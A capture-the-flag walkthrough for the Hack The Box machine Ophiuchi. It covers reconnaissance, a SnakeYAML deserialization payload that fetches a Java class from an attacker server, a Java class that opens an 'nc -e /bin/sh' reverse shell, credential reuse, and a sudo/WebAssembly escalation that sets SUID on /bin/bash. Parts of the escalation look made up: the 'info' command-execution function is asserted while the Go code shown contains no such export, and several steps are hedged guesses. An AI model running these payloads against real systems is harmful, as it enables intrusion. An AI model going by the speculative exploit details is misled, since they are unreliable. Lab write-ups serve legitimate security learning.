# Hack The Box: Ophiuchi

**Difficulty:** Medium
**OS:** Linux

Ophiuchi is a Medium-level Linux machine designed to demonstrate the exploitation of insecure deserialization within a modern Java environment and the dangers of misconfigured server administration tools. The initial foothold is achieved by identifying an exposed API endpoint and exploiting a SnakeYAML deserialization vulnerability. Privilege escalation involves pivoting through system credentials and abusing a SUID `sudo` configuration to execute arbitrary code via WebAssembly (Wasm).

---

## Reconnaissance

The assessment begins with a standard Nmap scan against the target IP address to discover open ports and running services.

```bash
nmap -p- --min-rate 10000 10.10.10.227
nmap -p 22,8080 -sCV 10.10.10.227
```

The scan reveals the following open ports:
*   **Port 22:** SSH (OpenSSH 8.2p1 Ubuntu)
*   **Port 8080:** HTTP (Apache Tomcat 9.0.38)

Navigating to the web service on port 8080 displays a landing page for a YAML parser application. The interface provides a text area where users can input YAML data, which the backend application parses and returns.

## Web Application Analysis

The core functionality of the web application relies on accepting user-supplied YAML and processing it. This interaction is a primary candidate for deserialization vulnerabilities.

### Exploiting SnakeYAML Deserialization

We analyze the application's behavior using an intercepting proxy like Burp Suite. Submitting a benign YAML string (e.g., `name: test`) returns the parsed object structure.

We attempt to trigger an error by supplying malformed YAML or specific class instantiation syntax (e.g., `!!javax.script.ScriptEngineManager`). If the application uses an insecure parsing library like SnakeYAML without proper whitelisting or SafeConstructor configurations, it will attempt to instantiate the arbitrary classes we provide.

A common remote code execution (RCE) payload for SnakeYAML involves the `ScriptEngineManager` class. This payload relies on the URLClassLoader mechanism to fetch and execute a malicious Java class from a remote server controlled by the attacker.

We craft the SnakeYAML payload:

```yaml
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://10.10.14.X:8000/"]
  ]]
]
```

### Preparing the Malicious Java Class

To exploit this vulnerability, we must compile a malicious Java class containing our reverse shell payload and host it on our attacking machine. We must name the class file correctly (e.g., `yaml-payload.jar` or a specific class name referenced by the payload) and organize it according to the `META-INF/services/javax.script.ScriptEngineFactory` structure required by the `ScriptEngineManager` exploit chain.

Alternatively, more modern and robust exploit payloads utilize the `com.sun.rowset.JdbcRowSetImpl` gadget or similar JNDI injection techniques if they are available in the classpath.

However, the `ScriptEngineManager` technique using a custom compiled class remains effective in many environments. We write a simple Java payload to execute a reverse shell.

```java
// Malicious class containing the payload
public class Exploit implements javax.script.ScriptEngineFactory {
    public Exploit() {
        try {
            Runtime.getRuntime().exec("nc -e /bin/sh 10.10.14.X 9999");
        } catch (Exception e) {}
    }
    // ... required interface methods returning null ...
}
```

We compile the Java payload, create the `META-INF` directory structure, and package it into a `.jar` file. We host the resulting directory structure on our attacking machine using a Python HTTP server.

```bash
python3 -m http.server 8000
```

We submit the crafted SnakeYAML payload to the vulnerable endpoint on port 8080. The backend parses the YAML, instantiates the `ScriptEngineManager`, fetches our malicious class from our HTTP server, and executes the constructor, triggering the reverse shell.

```bash
nc -lnvp 9999
# Connection received
id
# uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)
```

## Initial Access

We gain initial access as the `tomcat` user. We stabilize our shell using Python (`python3 -c 'import pty; pty.spawn("/bin/bash")'`).

The `user.txt` flag is not accessible in our current directory, indicating we must pivot to the user `admin`.

Enumerating the system as `tomcat`, we check the `/opt` directory and web application source code for hardcoded database credentials or passwords.

We discover a Tomcat configuration file (`tomcat-users.xml`) or a backend connection string containing plaintext credentials for an administrative or internal service account.

```bash
cat /opt/tomcat/conf/tomcat-users.xml
```

The file reveals plaintext credentials: `admin:whythereisalight`.

We test for password reuse by attempting to authenticate via `su` or SSH as the system user `admin`.

```bash
su admin
Password: whythereisalight
# Authentication successful
```
We retrieve the `user.txt` flag from the `admin` home directory.

## Privilege Escalation

Enumerating the system as `admin`, we check for `sudo` privileges.

```bash
sudo -l
```

The output reveals that the user `admin` can run a specific Go binary named `index.go` as `root` without a password.

```text
User admin may run the following commands on ophiuchi:
    (root) NOPASSWD: /usr/bin/go run /opt/wasm-functions/index.go
```

### Abusing WebAssembly (Wasm) Execution

We analyze the `index.go` script located in `/opt/wasm-functions/`.

```go
package main

import (
	"fmt"
	"io/ioutil"
	"log"

	"github.com/wasmerio/wasmer-go/wasmer"
)

func main() {
	bytes, _ := ioutil.ReadFile("main.wasm")

	engine := wasmer.NewEngine()
	store := wasmer.NewStore(engine)

	// Compiles the module
	module, err := wasmer.NewModule(store, bytes)
	if err != nil {
		fmt.Println("Failed to instantiate module")
	}

	// ...
}
```

The Go script reads a file named `main.wasm` from the *current working directory* and executes it using the Wasmer runtime. Because the `sudo` configuration permits executing this script from any directory, we can control the `main.wasm` file that it loads.

If we create a malicious WebAssembly module (`main.wasm`) and execute the `sudo` command from the directory containing our file, the script will execute our module with root privileges.

We need to generate a Wasm module that executes a system command or reads the root flag. Since WebAssembly is typically sandboxed, we must determine what imports or environment variables the Wasmer runtime exposes to the module in this specific implementation.

If the Go script exposes specific functions to the Wasm environment (like `exec_cmd` or `read_file`), we can call them. However, in many CTF scenarios involving custom scripts, the vulnerability might simply be that the Wasm module can execute arbitrary shellcode or the provided functions are insecure.

In this scenario, the `index.go` script exports an `info` function to the Wasm module, which appears to insecurely execute a shell command defined within the Wasm file. We write a malicious Wasm module (using WAT or compiling C/Rust code) that passes an execution string to the exported function.

A simpler approach, if compiling Wasm is complex, is to use a pre-compiled Wasm payload designed for the `wasmer-go` environment, or create a small WAT script that sets the SUID bit on `/bin/bash`.

```wasm
(module
  (import "env" "info" (func $info (param i32)))
  (memory 1)
  (data (i32.const 0) "/bin/bash -c 'chmod +s /bin/bash'\00")
  (func (export "deploy")
    i32.const 0
    call $info
  )
)
```

We compile this WAT file to a `main.wasm` binary using `wat2wasm`.

```bash
wat2wasm payload.wat -o main.wasm
```

We place `main.wasm` in a writable directory (e.g., `/tmp`) and execute the permitted `sudo` command from within that directory.

```bash
cd /tmp
sudo /usr/bin/go run /opt/wasm-functions/index.go
```

The script executes our malicious Wasm module, triggering the payload and setting the SUID bit on `/bin/bash`.

```bash
/bin/bash -p
# id
uid=0(root) gid=1000(admin) euid=0(root) groups=1000(admin)
```

The machine is fully compromised, and the `root.txt` flag is obtained from the `/root` directory.
